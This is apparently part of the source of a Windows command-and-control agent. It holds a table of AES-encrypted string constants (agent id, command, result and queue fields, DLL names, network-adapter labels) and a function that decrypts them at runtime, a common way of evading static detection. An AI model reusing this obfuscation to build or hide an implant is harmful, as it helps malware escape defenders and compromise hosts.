    RETRIEVINGHEADERS_CRYPT = "ea8e4e0797e56a3c5cac619e90f8c541fda28a96473abb0400b28c5da3b8adf6fc72";
    OPENINGIMAGE_CRYPT = "f79b5f1b97ee7b755ba620919019678324be4b83837e7a97f45c4b6b65";
    QUERYINGFILEINFO_CRYPT = "e99e5f0787e9723212ad289a90b9c84ae9be35ed6ec678d6873b2f3c4b501555930c";
    READINGIMAGE_CRYPT = "ea8e5b1197ee7b755ba62091900858613d8e22967bc6f50dbe2aa4f294";
    KERNEL32DLL_CRYPT = "d38e481b9bec2f671caf2d9a5357fbf15ac8a1bd5fb4bd6dd7a476aa";
    ADVAPI32DLL_CRYPT = "d98f4c148ee92f671caf2d9a34794f83ae3da8d74e31cbe39a43c5f8";
    CRYPT32DLL_CRYPT = "db9943058ab32e7b56a72d11ed244d53b8c72d4a621b7644c051dc";
    USER32DLL_CRYPT = "cd985f07cdb232315ea73e8bae7aa8aab277474f9d144ef31d46";
    SHELL32DLL_CRYPT = "cb835f1992b32e7b56a72de2bf5782daf3f3eeb8caa33f24028a7b";
    WINHTTPDLL_CRYPT = "cf82541d8af46c7b56a72deb84420d90f9d1e9cc5176bfc38b0166";
    MSCOREEDLL_CRYPT = "d598591a8ce5797b56a72de5b97a406fcfe60081abde96cc8e5bd8";
    OLEAUT32DLL_CRYPT = "d7875f148bf42f671caf2d9ad56e06b30a1a1b9a87fb04e348e3e4b8";
    WS2_32DLL_CRYPT = "cf98082acdb232315ea714f67160f5ccd8c6b6dd93f6ffd490f1";
    KERNELBASEDLL_CRYPT = "d38e481b9bec7e3441ae6f9299f5455c32e334edd056c0045d94bd1de38e";
    CRYPTSPDLL_CRYPT = "db9943058af36c7b56a72d2e03cbe4a7de81ee3917230588bda0b2";
    IPHLPAPIDLL_CRYPT = "d19b52198ee16c3c1caf2d9a2d7f9ceecbaac8dd46c21c73b9d67db9";
    INITIALIZINGCRITICALSECTION_CRYPT = "f185530197e1703c48a22f91d5fad34dfbb896f03d89f16d473ead54cbaebcc45c5d114ed0d6308fe72890ec8b";
    ALLOCATINGMEMORY_CRYPT = "f987561a9de1683c5cac619b90f4ce56f6d53a42abc44c837ac0c5d394974a5540";
    IDJSONPATTERN_CRYPT = "9aa27e57c4a56a70b663a94ad01771ed9276f47626";
    AGENTIDJSONPATTERN_CRYPT = "9aaa5d1090f4551110f1aa78fb2830bbf53e1e34c4b9ef7e5db8";
    TIMEOUTJSONPATTERN_CRYPT = "9abf53189bef692110f1883dfd2a06bd46f8e013f7630ec44481";
    ACTIVEJSONPATTERN_CRYPT = "9aaa590197f6797708fbc12408c22b6b04fba3db0abaa61432";
    SUCCESSJSONPATTERN_CRYPT = "9ab84f169de56f2610f1ded29f49fcae5f043a249d28fb50b4b5";
    INQUEUEJSONPATTERN_CRYPT = "9aa254248be5693010f1b09f354595b57514c9ecabe0a19d7ffd";
    TIMEDOUTJSONPATTERN_CRYPT = "9abf53189be4532046e97bd73d002d8060ee7473d96ec43a3c644b";
    TRUEJSONPATTERN_CRYPT = "cc994f1002c4e54f5f944bcc7f13aeaa3e8b136a";
    COMMANDJSONPATTERN_CRYPT = "9aa8551893e1723110f1b2dfec919285cff18362e8bd3b01c3b3";
    CREATETIMEJSONPATTERN_CRYPT = "9aa848109ff479015ba624d4cf0fc56dcfd6e29865bde2fb4650e8dd0f";
    ENDTIMEJSONPATTERN_CRYPT = "9aae5411aae9713010f1faeabf5e94a0800320120219c5133c1b";
    RESULTJSONPATTERN_CRYPT = "9ab95f068bec68770828bb6dd2828ed2e698dad185c535d46a";
    ARGUMENTSJSONPATTERN_CRYPT = "9aaa48128bed793b46b863cc4d00ab5f76695063ab00142097b224d6";
    NULLPOINTERPASSEDTOSECURESTRINGCONSTRUCTOR_CRYPT = "f69e5619def0733c5cbf2484d5e9c057fcb491b125c6a25b4129b149c07b05576540a8c96f221d7e8b60a2c6517fd7fab7176f856df9cde88a623519095bde";
    NULLPOINTERPASSEDTOSECURESTRINGASSIGN_CRYPT = "f69e5619def0733c5cbf2484d5e9c057fcb491b125c6a25b4129b149c07b05576540a8d3362c007e9675b9f18fca21a9cfdf8f868ea10cc08325ac";
    EMPTYRANGEPASSEDTOSECURESTRINGCONSTRUCTOR_CRYPT = "fd864a0187a06e345cac24d685f8d257eab5d5e53e89d16d473fb65ef65c034c6249ef8a632300798d67b4d14a6260b45c3bad4416d0703ab2cdc3bb4ce1";
    EMPTYRANGEPASSEDTOSECURESTRINGASSIGN_CRYPT = "fd864a0187a06e345cac24d685f8d257eab5d5e53e89d16d473fb65ef65c034c6249f5d36d3e0064987c5c5b9b143871683afe148e24d60f8149";
    RANDOMBYTESGENERATIONERROR_CRYPT = "ea8a541191ed3c374bbf2485d5fec44aeaa394e538c6ec284138b654d70c75d17d9d568be39c0876a4a14aa4bd";
    INVALIDHEXCHARACTER_CRYPT = "f1854c1492e978755aae39d696f1c056eeb281f423fd9b7969a8089d6dd5bf0f838fd913a6";
    INDEXOUTOFRANGE_CRYPT = "f1855e1086a0732046eb2e90d5ebc04ae8b46652111a733b3afabcf336497a481e70";
    NULLPOINTERPASSEDTOSECUREWIDESTRINGCONSTRUCTOR_CRYPT = "f69e5619def0733c5cbf2484d5e9c057fcb491b125c6a25b4129b149c07f1841697dbb9b6523142d9c7db9d65162d0c4b9f1d6c78402db53cf9cc597cbe4ee158d97db";
    EMPTYRANGEPASSEDTOSECUREWIDESTRINGCONSTRUCTOR_CRYPT = "fd864a0187a06e345cac24d685f8d257eab5d5e53e89d16d473fb65ef24115405f5abd80622a536e907ca4d15765c6d3a2ec2b3236f485e02be3c9bcf5f4043db9ac";
    EMPTYRANGEPASSEDTOSECUREWIDESTRINGAPPEND_CRYPT = "fd864a0187a06e345cac24d685f8d257eab5d5e53e89d16d473fb65ef24115405f5abd80622a49379e62a7c04b7432a4514814c61eb1a41a23e8e82c50f7";
    CREATINGEVENT_CRYPT = "fb995f148ae9723212ae37939bed6d622f40ded9f544266ba04733e89d74";
    ALLOCATINGANEWTHREADPOOL_CRYPT = "f987561a9de1683c5cac6197d5f7c453afa59de334c8e6285425ab57012c91f66b594a1bb86fdcd915eca5d0";
    SETTINGTHEMINIMUMNUMBEROFTHREADSFORTHEPOOL_CRYPT = "eb8e4e0197ee7b7546a324d698f0cf4de2a498b13fdcef6a4138e454c308054d7e4bae8d7f6d15628d32a3cd4030d5c8a2f25c2a14dbf5096d1c1d607a71e0436260";
    SETTINGTHEMAXIMUMNUMBEROFTHREADSFORTHEPOOL_CRYPT = "eb8e4e0197ee7b7546a324d698f8d94de2a498b13fdcef6a4138e454c308054d7e4bae8d7f6d15628d32a3cd4030d5c8a2f263720a66c5850afdd4767b6a22f36a1b";
    ALLOCATINGAWORKITEM_CRYPT = "f987561a9de1683c5cac6197d5eece56e4f19ce534c42c2d2515e9a58edd95b0c3d7793bf21a";
    POSTINGTHEWORKITEMTOTHETHREADPOOL_CRYPT = "e884490197ee7b7546a324d682f6d34fafb881f43c89f667043eac5e855c1957694fabc97c221c61edc88ef4a2c5143abcb2bb9536b1a374";
    NONE_CRYPT = "f6a47430499de00e90065943a338265e0be2c763";
    OTHER_CRYPT = "f7bf7230ac588661bbf28e60e99e64360ec59d3e6e";
    TEREDO_CRYPT = "ecae6830bacfe540aa77c7c05090e6d242ed888d17d1";
    IPHTTPS_CRYPT = "f1bb7221aad04fe4d8e419b75bdcf627d09d661ba52718";
    ISATAP_CRYPT = "f1b87b21bfd0e52cdcec679f765ee4fb437bfd820916";
    SIXTOFOUR_CRYPT = "8ebf75419ce13a0bebfa6000fd0db0bda6b04580";
    DIRECT_CRYPT = "fca26830bdd422a5efdb5d011cc8434dfa47b5533ba0";
    OTHER_CAP_CRYPT = "f79f52108cc0631d6700da58d699e6912bbae0a1d8";
    ETHERNET_CRYPT = "fd9f52108cee7921d217ba0df3d7d4290e8c59d68ff549be";
    TOKENRING_CRYPT = "ec84511090a04e3c5cac375897987cb6c0fcd684a8b8666baf02";
    PPP_CRYPT = "e8bb6a53cf506064914e32ce1856df8996ed18";
    LOOPBACK_CRYPT = "f48455059ce17f3e11c9be9efdee0608e9bc5d483be3522c";
    ATM_CRYPT = "f9bf776f18dc49148f376d3d21d159dd6b22af";
    VIRTUAL_VPN_CRYPT = "ee8248018be170751a9d11b8dca1cf092e70efcb28694b1478fda8be30";
    IEEE802_11WIRELESS_CRYPT = "f1ae7f30deb82c671cfa70d6a2f0d341e3b486e278f6ca9c56279f5535e305325eb789e2";
    TUNNEL_CRYPT = "ec9e541b9becb9508591eeecea36b2745b1c1cd15526";
    IEEE1394_CRYPT = "f1ae7f30deb12f6c06d76213597385c980841018259c3f9bbc";
    WWANPP_CRYPT = "efbc7b3baed0a07652a8da75745aa8ebee54942b7239";
    WWANPP2_CRYPT = "efbc7b3baed02ed97564f14b629e63de129209434581d8";
    UNKNOWN_CAP_CRYPT = "ed85511b91f772080a32fa92bf081485cd2cb777b03dce";
    UP_CAP_CRYPT = "ed9b424db610f459ef67fbe0cf1c2f8f5600";
    DOWN_CAP_CRYPT = "fc844d1b5b7ad63b0a16cdae6f4331bda56832ae";
    SPACE_MBPS_CRYPT = "98a658058dc32b136defa0119dab2ba6df2f4255bd";
    SPACE_GBPS_CRYPT = "98ac58058de38384501e4b7b61e769d71bd020b2d1";
    N_SLASH_A_CRYPT = "f6c47b3d4193c83c546872b8e5d5125a59cc7b";
    TRUE_CAP_CRYPT = "ec994f103c2176497b1ddff2debfb8ce9dc52c74";
    FALSE_CAP_CRYPT = "fe8a56069b989c02b6ec6e99a2d7ae38c91ab9af83";
    ADAPTERNAMECOLON_CRYPT = "f98f5b058ae56e757caa2c93cfb90a2c327196d1dca15e74c1054d2e6826";
    ADAPTERDESCRIPTIONCOLON_CRYPT = "f98f5b058ae56e7576ae329587f0d150e6be9bab71b58ad4a47ce57e6b21b8f427b3d670a2";
    MACADDRESSCOLON_CRYPT = "f5aa7955bfe4782757b832ccd56efb7ba9c52e7351af842b07e0b836e2";
    DNSSUFFIXCOLON_CRYPT = "fca56955adf57a335bb37bd62f92763fd2bff766300b1d1117750db3";
    OPERATIONALSTATUSCOLON_CRYPT = "f79b5f079ff4753a5caa2dd6a6edc050faa2cfb1e785be8f8c7414374ebbcf6f6ae23abd";
    ADAPTERTYPECOLON_CRYPT = "f98f5b058ae56e7566b23193cfb9858df513c9985c4d9b52cb5ac5215609";
    TUNNELTYPECOLON_CRYPT = "ec9e541b9bec3c014bbb24ccd55683ffa215971e84c7fd34212edb406b";
    DHCPV4SERVERCOLON_CRYPT = "fca3792588b43c0657b9379387a38114a00085ac43d766d34f2c0ab27f4afc";
    DHCPV6SERVERCOLON_CRYPT = "fca3792588b63c0657b9379387a381589137469ecbf93fe32d6493f195503d";
    TRANSMITLINKSPEEDCOLON_CRYPT = "ec995b1b8ded7521128728989eb9f254eab491ab71a924ca04307d7e7ac5d2e4f185c5413d";
    RECEIVELINKSPEEDCOLON_CRYPT = "ea8e591097f679757ea22f9dd5cad141eab5cfb162059f15281a7a1a4c02fcea39cec996";
    ADDITIONALDNSSUFFIXCOLON_CRYPT = "f98f5e1c8ae9733b53a761b2bbca8177fab793f82993a273dcfcbd36a79ee36256535853319476";
    IPADDRESSCOLON_CRYPT = "f1bb1a349ae46e3041b87bd6238271f5e0324aad005cf4bf6626237b";
    DNSSERVERCOLON_CRYPT = "fca56955ade56e2357b97bd64b23dbeef75322a0727e4d80082f7d7f";
    WINSSERVERCOLON_CRYPT = "efa27426ded3792744ae33ccd5cb15e8a463c9d03c898db15039c0013a";
    GATEWAYADDRESSCOLON_CRYPT = "ff8a4e1089e1657573af258490ead21eafd6ebf862202ee647484d9b8492188df1";
    DDNSENABLEDCOLON_CRYPT = "fcaf7426dec5723450a72492cfb93424326621aaefb3fb6d0d6963efedb5";
    REGISTERADAPTERSUFFIXCOLON_CRYPT = "ea8e5d1c8df47927128a259785edc456af8280f737c0fa32045ea489cb95c35c2761f9aa17c9466161";
    DHCPV4ENABLEDCOLON_CRYPT = "fca3792588b43c105caa239a90fd9b0413c3f64a77023cc478a93533621a4a35";
    RECEIVEONLYCOLON_CRYPT = "ea8e591097f679757da52d8fcfb9ab1983bd8813ab2b3c8f46246500ced7";
    NOMULTICASTCOLON_CRYPT = "f6841a388bec683c51aa3282cfb9ad0aa1c51af1fc738b57012f2901de97";
    IPV6OTHERSTATEFULCONFIGCOLON_CRYPT = "f1bb4c43decf683d57b961a581f8d541e9a499b112c6ec6e4d2dfe1b071dc898a9316e967a0362127d94acff";
    NETBIOSOVERTCPIPENABLEDCOLON_CRYPT = "f68e4e37b7cf4f757dbd2484d5cde274a098a5b114c7e36a482fa00185cfeb08b9088c7d8c5e6848a69d74c81b";
    IPV4ENABLEDCOLON_CRYPT = "f1bb4c41dec5723450a72492cfb99000b251cbdd5c77b6cf763eca5c7495";
    IPV6ENABLEDCOLON_CRYPT = "f1bb4c43dec5723450a72492cfb9b3c380d9e5846c15fe5635d4d09d12df";
    IPV6MANAGEDADDRESSCONFIGCOLON_CRYPT = "f1bb4c43decd7d3b53ac2492d5d8c540fdb486e271eaed664223a30185f8021920da24e77a344308e42542e9df";
    GETTINGADAPTERADDRESSES_CRYPT = "ff8e4e0197ee7b7553af208681fcd304eeb591e334daf16d572547a58b6b36c596d26125c8ef60187b";
}

SecureString StringCrypt::DecryptString(SecureString str) {
	SecureString decrypted;
	decrypted = Crypt::AesDecrypt(str, Key, IV, true);
    return decrypted;
}